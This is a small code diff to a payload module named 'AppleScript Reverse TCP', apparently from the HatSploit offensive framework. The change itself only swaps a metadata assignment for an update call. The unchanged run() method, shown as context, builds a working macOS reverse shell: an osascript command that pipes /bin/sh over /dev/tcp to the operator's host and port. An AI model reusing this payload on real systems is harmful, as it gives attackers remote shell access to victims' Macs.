@@ -10,7 +10,7 @@ class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "AppleScript Reverse TCP",
             'Payload': "macos/generic/applescript_reverse_tcp",
             'Authors': [
@@ -21,7 +21,7 @@ class HatSploitPayload(Payload, Handler):
             'Platform': "macos",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
     def run(self):
         payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{self.rhost.value}/{self.rport.value} 0>&1 &\"'"
